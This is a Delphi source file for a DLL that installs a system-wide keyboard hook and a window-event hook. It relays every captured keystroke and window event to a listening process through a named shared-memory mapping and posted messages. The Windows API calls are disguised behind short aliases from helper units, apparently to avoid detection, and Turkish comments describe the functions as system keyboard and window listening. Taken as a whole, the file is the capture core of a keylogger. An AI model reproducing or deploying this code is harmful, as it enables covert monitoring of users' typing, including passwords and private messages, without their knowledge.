library Kbrd;

uses
  Windows,
  uEnc in 'uEnc.pas',
  uKbrdDl in 'uKbrdDl.pas';

var
  KBHk, CHk: HHook;
  FM, CHandle: THandle;
  PReceptor, CPtr: ^Integer;

function CallBackHk(Code: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
  Result := CNHE(KBHk, Code, wParam, lParam);

  if code = 0 then
  begin
    FM := OFM(4, False, 'ERCx');
    if FM <> 0 then
      if Code < 0 then
        Exit
      else begin
        PReceptor := MVOF(FM, 4, 0, 0, 0);
        PM(PReceptor^, $0400 + $1200, wParam, lParam);
        UVOF(PReceptor);
        CH(FM);
      end;
  end;
end; {* CallBackHook -> Sistem Klavye Dinleme Fonksiyonu *}

function CCallBackHk(Code: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
  Result := CNHE(CHk, Code, wParam, lParam);

  if code = 5 then
  begin
    CHandle := OFM(4, False, 'ERCx');
    if CHandle <> 0 then
      if Code < 0 then
        Exit
      else begin
        CPtr := MVOF(CHandle, 4, 0, 0, 0);
        PM(CPtr^, $0400 + $1300, wParam, lParam);
        UVOF(CPtr);
        CH(CHandle);
      end;
  end;
end; {* CBTCallBackHook -> Sistem Pencere Dinleme Fonksiyonu *}

procedure HOn; stdcall;
begin
  KBHk := SWHE(2, @CallBackHk, HInstance, 0);
  CHk := SWHE(5, @CCallBackHk, HInstance, 0);
end; {* HookOn -> Sistem Klavye Dinlemeyi Baþlat *}

procedure HOff; stdcall;
begin
  UWHE(KBHk);
  UWHE(CHk);
end; {* HookOff -> Sistem Klavye Dinlemeyi Durdur *}

exports
  HOn, HOff;

begin
end.

